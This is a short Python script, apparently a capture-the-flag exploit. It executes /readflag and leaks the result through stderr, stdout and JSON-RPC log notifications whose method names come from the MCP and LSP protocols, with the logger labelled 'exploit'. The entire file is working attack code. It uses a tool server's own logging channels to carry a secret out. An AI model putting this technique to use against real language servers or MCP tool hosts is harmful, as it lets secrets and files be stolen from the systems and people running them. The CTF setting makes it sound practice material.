import subprocess
import json
import sys
import time

def send_log(msg):
    # Try different logging methods from MCP and LSP specs
    methods = ["notifications/message", "window/logMessage", "telemetry/event"]
    for m in methods:
        message = {
            "jsonrpc": "2.0",
            "method": m,
            "params": {
                "type": 1, # Error for LSP
                "level": "error", # MCP
                "message": msg, # LSP
                "data": msg, # MCP
                "logger": "exploit"
            }
        }
        print(json.dumps(message))
        sys.stdout.flush()

try:
    # Try simple execution first
    flag = "COULD_NOT_READ"
    try:
        flag = subprocess.check_output(["/readflag"], timeout=5).strip().decode()
    except Exception as e:
        flag = f"EXEC_FAIL: {e}"
        # Try harder? Maybe it needs a solve?
    
    log_msg = f"FLAG_OUTPUT: {flag}"
    
    # 1. Print to stderr (might be captured)
    sys.stderr.write(log_msg + "\n")
    sys.stderr.flush()
    
    # 2. Send as JSON-RPC notification
    send_log(log_msg)
    
    # 3. Print raw to stdout (might trigger parse error log)
    print(log_msg)
    sys.stdout.flush()

except Exception as e:
    sys.stderr.write(f"FATAL: {e}\n")
